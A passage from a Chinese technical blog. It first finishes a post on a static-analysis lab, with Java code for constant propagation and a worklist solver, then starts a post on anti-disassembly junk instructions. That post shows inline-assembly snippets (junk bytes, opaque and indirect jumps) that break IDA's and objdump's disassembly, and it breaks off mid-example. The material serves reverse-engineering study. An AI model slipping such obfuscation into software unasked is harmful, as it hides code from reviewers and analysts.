href="#代码总览"></a> 代码总览</h4><p>​这里主要是实现ConstantPropagation类的六个方法</p><ol><li><code>public CPFact newBoundaryFact(CFG)</code></li><li><code>public CPFact newInitialFact()</code></li><li><code>public void meetInto(CPFact, CPFact)</code></li><li><code>public boolean transferNode(Stmt, CPFact, CPFact)</code></li><li><code>public Value meetValue(Value, Value)</code></li><li><code>public Value evaluate(Exp, CPFact)</code></li></ol><p>前四个就是对应于边界的初始化，BB块的初始化，数据流交汇的处理和状态转移方程的处理，而后面两种方法则是由于常量传播的性质，需要在交汇与状态转移过程中对于 Value 进行额外处理，所以抽取出成为一个新的方法，以供交汇和状态转移进行处理</p><h4 id="newboundaryfact"><a class="markdownIt-Anchor" href="#newboundaryfact"></a> newBoundaryFact</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> CPFact <span class="hljs-title function_">newBoundaryFact</span><span class="hljs-params">(CFG&lt;Stmt&gt; cfg)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 初始化每一个OUT节点向量为NAC类型</span><br>       <span class="hljs-type">CPFact</span> <span class="hljs-variable">fact</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CPFact</span>();<br>       <span class="hljs-comment">// 获得 IR(每个被处理语句)的参数, 我理解这里是边界初始化, 所以都是简单赋值, 而不是其他语句一样进行计算</span><br>       <span class="hljs-keyword">for</span> (Var <span class="hljs-keyword">var</span> : cfg.getIR().getParams()) &#123;<br>           <span class="hljs-comment">//判断是否是Int类型, 其余类型最终都可以归于Int类型</span><br>           <span class="hljs-keyword">if</span> (canHoldInt(<span class="hljs-keyword">var</span>)) &#123;<br>               fact.update(<span class="hljs-keyword">var</span>, Value.getNAC());<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> fact;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里通过CFG获取所有的变量(var)，然后将它的状态赋值为NAC，相当于赋值为空(不是常量)。与 Lab1 相比，这里因为存储fact的类型为<code>MapFact&lt;Var, Value&gt;</code>，它是一个键值对，所以需要获取所有变量进行初始化，而lab1是直接把<code>SetFact&lt;Var&gt;</code>赋值为空，符合它只有变量活跃才加入数组的特性(这里看上面对于analysis下CPFact方法的解释)</p><h4 id="meetinto"><a class="markdownIt-Anchor" href="#meetinto"></a> meetInto</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">meetInto</span><span class="hljs-params">(CPFact fact, CPFact target)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">// 利用格上的 meet 方法进行实现, 提供了不同分支传递同一个变量的赋值的交汇处理</span><br>    <span class="hljs-comment">// 这里 keySet 就是 val(x) 中的 x, 这里就是对于x变量赋值的交汇</span><br>    <span class="hljs-keyword">for</span> (Var <span class="hljs-keyword">var</span> : fact.keySet()) &#123;<br>        target.update(<span class="hljs-keyword">var</span>, meetValue(fact.get(<span class="hljs-keyword">var</span>), target.get(<span class="hljs-keyword">var</span>)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​负责进行数据流的交汇操作，提取了 <code>meetValue</code> 方法出来，它来负责不同value的交汇。</p><h4 id="transfernode"><a class="markdownIt-Anchor" href="#transfernode"></a> transferNode</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferNode</span><span class="hljs-params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 这里实现的是对于 statement 的处理, 即 BB 内部的数据流的处理，DefinitionStmt表示了程序中所有的赋值语句</span><br>       <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> DefinitionStmt&lt;?, ?&gt;) &#123;<br>           <span class="hljs-type">LValue</span> <span class="hljs-variable">lv</span> <span class="hljs-operator">=</span> ((DefinitionStmt&lt;?, ?&gt;) stmt).getLValue();<br>           <span class="hljs-type">RValue</span> <span class="hljs-variable">rv</span> <span class="hljs-operator">=</span> ((DefinitionStmt&lt;?, ?&gt;) stmt).getRValue();<br>           <span class="hljs-comment">// 判断左侧是否是变量, 特别判断是否是 Int 类型的变量(其它类型也包含在 Int 类型中)</span><br>           <span class="hljs-keyword">if</span> (lv <span class="hljs-keyword">instanceof</span> Var &amp;&amp; canHoldInt((Var) lv)) &#123;<br>               <span class="hljs-type">CPFact</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> in.copy();<br>               <span class="hljs-comment">// evaluate 用来处理右侧变量与这个 BB 的 IN 的交汇</span><br>               tmp.update((Var) lv, evaluate(rv, in));<br>               <span class="hljs-keyword">return</span> out.copyFrom(tmp);<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> out.copyFrom(in);<br>   &#125;<br></code></pre></td></tr></table></figure><p>​状态转移方程，主要处理赋值语句，利用 <code>evaluate</code> 将in的结果带入右侧的二元表达式(rv)进行处理，然后更新相应的键值对</p><h4 id="meetvalue"><a class="markdownIt-Anchor" href="#meetvalue"></a> meetValue</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Value <span class="hljs-title function_">meetValue</span><span class="hljs-params">(Value v1, Value v2)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 基于给出的格的案例进行编写, 这里我的理解 meetValue 就是对于上面传下来的对同一个变量的赋值的交汇</span><br>       <span class="hljs-comment">// 首先判断存在 NAC 的情况</span><br>       <span class="hljs-keyword">if</span> (v1.isNAC() || v2.isNAC()) &#123;<br>           <span class="hljs-keyword">return</span> Value.getNAC();<br>       &#125;<br>       <span class="hljs-comment">// 除去 NAC, 最坏就是 Undef了, 如果都是 Undef, 那么返回的也是 Undef</span><br>       <span class="hljs-keyword">if</span> (v1.isUndef() || v2.isUndef()) &#123;<br>           <span class="hljs-keyword">return</span> v1.isUndef() ? v2 : v1;<br>       &#125;<br>       <span class="hljs-comment">// 余下就都是 constant 的情况了</span><br>       <span class="hljs-keyword">if</span> (v1.equals(v2)) &#123;<br>           <span class="hljs-keyword">return</span> Value.makeConstant(v1.getConstant());<br>       &#125;<br>       <span class="hljs-comment">// 两个常量不同的情况, 返回 NAC</span><br>       <span class="hljs-keyword">return</span> Value.getNAC();<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是对于数据流交汇数据的处理，从左右两边流下来的对于同一变量的表达式，根据右侧的情况进行判断交汇后的情况。具体的交汇情况根据part2中所写，大致存在4中情况。</p><h4 id="evaluate"><a class="markdownIt-Anchor" href="#evaluate"></a> evaluate</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Value <span class="hljs-title function_">evaluate</span><span class="hljs-params">(Exp exp, CPFact in)</span> &#123;<br>        <span class="hljs-comment">/* TODO - finish me */</span><br>        <span class="hljs-comment">// 这里 exp 就是 transfer function 的右侧表达式，而 in 就是目前的常量数据，参照上文CPFact类</span><br>        <span class="hljs-comment">// 定义最终的返回值</span><br>        <span class="hljs-type">Value</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Value.getNAC();<br>        <span class="hljs-comment">// 根据 Exp 接口子类的类型来进行处理</span><br>        <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> IntLiteral) &#123;<br>            <span class="hljs-keyword">return</span> Value.makeConstant(((IntLiteral) exp).getValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> Var) &#123;<br>            <span class="hljs-keyword">return</span> in.get((Var) exp);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> InvokeExp)&#123;<span class="hljs-comment">// 这里通过给的最后一个案例，需要判断不是给定范围的情况</span><br>            <span class="hljs-keyword">return</span> Value.getNAC();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> BinaryExp) &#123;<br>            <span class="hljs-comment">// 从二元表达式中获取两个操作数---&gt; 获取 x</span><br>            <span class="hljs-type">Var</span> <span class="hljs-variable">op1</span> <span class="hljs-operator">=</span> ((BinaryExp) exp).getOperand1();<br>            <span class="hljs-type">Var</span> <span class="hljs-variable">op2</span> <span class="hljs-operator">=</span> ((BinaryExp) exp).getOperand2();<br>            <span class="hljs-comment">// 从数据流中依据操作数在控制流上的定义来获取准确的操作数的值---&gt; 获取 val(x)</span><br>            <span class="hljs-type">Value</span> <span class="hljs-variable">op1_val</span> <span class="hljs-operator">=</span> in.get(op1);<br>            <span class="hljs-type">Value</span> <span class="hljs-variable">op2_val</span> <span class="hljs-operator">=</span> in.get(op2);<br>            <span class="hljs-comment">// 定义两个操作数之间的操作符</span><br>            BinaryExp.<span class="hljs-type">Op</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> ((BinaryExp) exp).getOperator();<br>            <span class="hljs-comment">// 根据操作数是否是常量进行划分</span><br>            <span class="hljs-keyword">if</span> (op1_val.isConstant() &amp;&amp; op2_val.isConstant()) &#123;<br>                <span class="hljs-comment">// 根据表达式的类型进行划分 -- f(y,z) = val(y) op val(z)</span><br>                <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> ArithmeticExp) &#123;<br>                    <span class="hljs-keyword">if</span> (op == ArithmeticExp.Op.ADD) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() + op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ArithmeticExp.Op.SUB) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() - op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ArithmeticExp.Op.MUL) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() * op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ArithmeticExp.Op.DIV) &#123;<br>                        result = op2_val.getConstant()==<span class="hljs-number">0</span> ? Value.getUndef(): Value.makeConstant(op1_val.getConstant() / op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ArithmeticExp.Op.REM) &#123;<br>                        result = op2_val.getConstant()==<span class="hljs-number">0</span> ? Value.getUndef(): Value.makeConstant(op1_val.getConstant() % op2_val.getConstant());<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> BitwiseExp) &#123;<br>                    <span class="hljs-keyword">if</span> (op == BitwiseExp.Op.OR) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() | op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == BitwiseExp.Op.AND) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &amp; op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == BitwiseExp.Op.XOR) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() ^ op2_val.getConstant());<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> ShiftExp) &#123;<br>                    <span class="hljs-keyword">if</span> (op == ShiftExp.Op.SHL) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &lt;&lt; op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ShiftExp.Op.SHR) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &gt;&gt; op2_val.getConstant());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ShiftExp.Op.USHR) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &gt;&gt;&gt; op2_val.getConstant());<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> ConditionExp) &#123;<br>                    <span class="hljs-keyword">if</span> (op == ConditionExp.Op.EQ) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() == op2_val.getConstant() ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ConditionExp.Op.NE) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() != op2_val.getConstant() ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ConditionExp.Op.GE) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &gt;= op2_val.getConstant() ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ConditionExp.Op.LE) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &lt;= op2_val.getConstant() ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ConditionExp.Op.GT) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &gt; op2_val.getConstant() ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == ConditionExp.Op.LT) &#123;<br>                        result = Value.makeConstant(op1_val.getConstant() &lt; op2_val.getConstant() ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<span class="hljs-comment">// f(y,z) = NAC</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op1_val.isNAC() || op2_val.isNAC()) &#123;<br>                <span class="hljs-keyword">if</span> (exp <span class="hljs-keyword">instanceof</span> ArithmeticExp &amp;&amp; (op == ArithmeticExp.Op.DIV || op == ArithmeticExp.Op.REM)) &#123;<br>                    result = (op2_val.isConstant() &amp;&amp; op2_val.getConstant() == <span class="hljs-number">0</span>) ? Value.getUndef(): Value.getNAC();<br>                &#125;<br>            &#125;<span class="hljs-comment">// f(y,z) = UNDEF</span><br>            <span class="hljs-keyword">else</span> &#123;<br>                result = Value.getUndef();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​这里参照上文中的 <code>Exp</code> 类的各种子类进行分别分析，然后对于最为复杂的右侧为表达式的情况，又根据表达式的不同分为数种情况进行分析，这里就是体现了状态转移中的f(y,z)的情况。</p><h2 id="工作表算法"><a class="markdownIt-Anchor" href="#工作表算法"></a> 工作表算法</h2><h3 id="具体代码-2"><a class="markdownIt-Anchor" href="#具体代码-2"></a> 具体代码</h3><h4 id="代码总览-2"><a class="markdownIt-Anchor" href="#代码总览-2"></a> 代码总览</h4><p>需要完成以下两个方法</p><ul><li><code>Solver.initializeForward(CFG,DataflowResult)</code></li><li><code>WorkListSolver.doSolveForward(CFG,DataflowResult)</code></li></ul><p>​上面的那个就是初始化操作，后面就完成了工作表算法</p><h4 id="initializeforward"><a class="markdownIt-Anchor" href="#initializeforward"></a> initializeForward</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeForward</span><span class="hljs-params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;<br>        <span class="hljs-comment">/* TODO - finish me */</span><br>        <span class="hljs-comment">// 初始化最开始的 BB</span><br>        result.setOutFact(cfg.getEntry(), analysis.newBoundaryFact(cfg));<br>        <span class="hljs-comment">// 这条语句需要添加, 否则就是空指针异常，这里不太了解为什么 Entry 的 IN 也需要初始化一下</span><br>        <span class="hljs-comment">// 根据WorkListSolver中的情况，配置worklist跳过加载初始结点即可不用赋值</span><br><span class="hljs-comment">//        result.setInFact(cfg.getEntry(), analysis.newBoundaryFact(cfg));</span><br>        <span class="hljs-comment">// 初始化每个语句的 IN 和 OUT</span><br>        <span class="hljs-keyword">for</span>(Node node: cfg.getNodes())&#123;<br>            <span class="hljs-keyword">if</span>(!cfg.isEntry(node))&#123;<br>                result.setInFact(node, analysis.newInitialFact());<br>                result.setOutFact(node, analysis.newInitialFact());<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>​这里需要注意初始化 Entry 的 IN，一个猜想是newBoundaryFact是把所有 Int 类型的变量加入 <code>MapFact&lt;Var, Value&gt;</code> 的键值对中，这个所有Int变量都有的键值对必须存在，因为后面都是对于键值对的 Value 进行处理的，如果不存在用到的键值对，也确实成为了一个空指针。</p><h4 id="dosolveforward"><a class="markdownIt-Anchor" href="#dosolveforward"></a> doSolveForward</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSolveForward</span><span class="hljs-params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 构造 WorkList 队列, 同时在构造中即可实现对于所有 BB 的添加, 使用队列保证从前往后</span><br>       Queue&lt;Node&gt; WorkList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();<br>       <span class="hljs-keyword">for</span> (Node node:cfg) &#123;<br>           <span class="hljs-keyword">if</span> (cfg.isEntry(node)) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<span class="hljs-comment">//这里就是对上面initializeForward一个语句result.setInFact的补充，不加载初始结点就不会存在空指针异常的问题，因为加上之后需要处理初始结点的Fact状态，不然和后面的初始化的结点就不相匹配了</span><br>           WorkList.add(node);<br>       &#125;<br>       <span class="hljs-comment">// 由此可以使用下面的替代上面的添加结点</span><br>       <span class="hljs-comment">//WorkList.addAll(cfg.getNodes());</span><br>       <span class="hljs-comment">//WorkList.remove(cfg.getEntry());</span><br><br>       <span class="hljs-keyword">while</span>(!WorkList.isEmpty())&#123;<br>           <span class="hljs-comment">// 返回队列的最前端</span><br>           <span class="hljs-type">Node</span> <span class="hljs-variable">BasicNode</span> <span class="hljs-operator">=</span> WorkList.poll();<br>           <span class="hljs-type">Fact</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> result.getInFact(BasicNode);<br>           <span class="hljs-type">Fact</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> result.getOutFact(BasicNode);<br><br><br>           <span class="hljs-comment">// 实现 meetInto 和 transferNode 的迭代过程</span><br>           <span class="hljs-keyword">for</span>(Node PreNode: cfg.getPredsOf(BasicNode))&#123;<br>               analysis.meetInto(result.getOutFact(PreNode), in);<br>           &#125;<br><br>           <span class="hljs-comment">// 这里通过 transferNode 的判断, 来简单处理 old_out 与 当前 out 是否相同, 进而判断是否添加前驱节点</span><br>           <span class="hljs-keyword">if</span>(!analysis.transferNode(BasicNode, in, out))&#123;<br>               <span class="hljs-keyword">for</span>(Node SucNode: cfg.getSuccsOf(BasicNode))&#123;<br>                   <span class="hljs-keyword">if</span>(!WorkList.contains(SucNode))<br>                       WorkList.add(SucNode);<br>               &#125;<br>           &#125;<br>       &#125;<br><br>   &#125;<br></code></pre></td></tr></table></figure><p>​工作表法，从所有 BB 中拿出来一个分析，如果 out 发生了改变，那么就要分析由这个改变产生的影响，也就是把后继的 BB 也加到工作表中进行后续处理。</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/posts/9ffaa92b.html"/>
    <url>/posts/9ffaa92b.html</url>
    
    <content type="html"><![CDATA[<h1 id="disassembly-introduction"><a class="markdownIt-Anchor" href="#disassembly-introduction"></a> Disassembly Introduction</h1><p>​针对目前主流的线性扫描反汇编(如obidump)和递归下降反汇编(ida)，通过插入一些汇编代码(花指令)干扰反汇编<br />器的识别，以达到千扰程序静态分析的目的。</p><blockquote><p>Linear Sweep: objdump、windbg、od(直接打开文件)<br />Recursive Traversal: ida、od(ctrl+a分析代码)</p></blockquote><ul><li>线性扫描反汇编(Linear Sweep): 一条指令的结束，下一条指令的开始，需要确定起始位置。其能覆盖到全部代码，但是在冯诺依曼体系结构下不能区分数据和指令，从而导致将代码段中嵌入的数据误解释为指令的操作码，错误的将数据和指令混合反汇编，比如遇到一个jmp，其仍会反汇编jmp后紧跟着的数据，而这些数据往往是垃圾数据或是转表的数据等</li><li>递归下降反汇编(Recursive Traversal): 递归下降算法中强调控制流，对可能的分支进行扫描，会根据指令是否被另一条指令引用来决定反汇编，但是其也会用到线性扫描来反汇编。它通过程序的控制流来确定反汇编的下一条指令，遇到非控制转移指令时顺序进行反汇编，而遇到控制转移指令时则从转移地址处开始进行反汇编(线性扫描)。缺点在于准确确定间接转移目的地址的难度较大，并且无法处理访问动态变量如堆栈和寄存器等数据。</li><li>IDA Pro简单介绍了递归下降反汇编(其处理顺序指令是线性扫描的方式)的一些缺陷，对于不明确的跳转除非启发式方法才能判断，并且其在处理call指令时会延时发编译，等等这些缺陷让我们能通过内联汇编来干扰IDA的反汇编</li></ul><blockquote><ul><li>对于分支处理，对false的情况继续线性反汇编其下的指令，而将true的目标地址放到稍后反汇编的地址列表中。</li><li>无条件分支，对于能识别出地址的跳转则会到目的地址进行反汇编，而不会继续反汇编后续地址的指令，因为可能是数据，但是如果的jmp eax间接跳转无法识别出地址，这时反汇编器可能就蒙了。</li><li>函数调用指令，因为call之后会回来继续执行，反汇编器会先线性扫描call紧跟的指令，并将call的目的地址放到延迟反汇编列表中，但如果call中会修改返回地址，那么递归下降就会失败的将call之后的指令反编译.</li><li>对于ret指令，递归下降反汇编无法访问栈信息，所以遇到ret就会停转。</li></ul><p>PS: 主要借鉴学长的博客，自己加了点新的东西</p></blockquote><h1 id="conditional-jmp"><a class="markdownIt-Anchor" href="#conditional-jmp"></a> Conditional jmp</h1><p>​反编译器会先对false的指令进行反汇编，目的地址的指令延时反汇编，那么直接jz后面跟一个垃圾代码就会让反汇编器失效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__asm&#123;<br>push eax<br>xor eax, eax<br>jz label1<br>label1:<br># junk code --&gt; example: __emit 0xe8;<br>pop eax<br>&#125;<br></code></pre></td></tr></table></figure><p>​它是最为常见的一种花指令方式，通过条件跳转来影响反汇编，这里0xE8被线性解析为了 call 导致反编译失败</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401281935607.png" alt="image-20240128193530512" /></p><h1 id="unconditional-jmp"><a class="markdownIt-Anchor" href="#unconditional-jmp"></a> Unconditional jmp</h1><p>​如果反汇编器能识别 jmp 的目标地址那么其会跳转到目标地址进行反汇编，如果其不能识别会干扰CFG的构建，因为根据 <code>基本块 A jmp 到 基本块B</code> 来建立基本块A和B的边，而 jmp eax 时的eax对于静态是不可知的所以无法构建CFG</p><blockquote><p>但如果直接mov eax，一个函数之后jmp IDA是可以识别调用的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__asm &#123; <br>    push eax<br>    mov eax, label1<br>    jmp eax<br>label1:<br>    pop eax<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里就是CFG中少了一条边，出现红色的 <code>JUMPOUT</code> 字段</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401281955050.png" alt="image-20240128195547015" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401281957367.png" alt="image-20240128195735320" /></p><p>​这个也是 jmp 的识别错误，导致多出了</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">__asm &#123;<br><span class="hljs-symbol">start:</span>// 多级跳转<br><span class="hljs-keyword">jmp</span> label1<span class="hljs-comment">;</span><br>__emit <span class="hljs-number">0xe8</span><span class="hljs-comment">;</span><br><span class="hljs-symbol">label1:</span><br><span class="hljs-keyword">jmp</span> label2<span class="hljs-comment">;</span><br>__emit <span class="hljs-number">0xe8</span><span class="hljs-comment">;</span><br><span 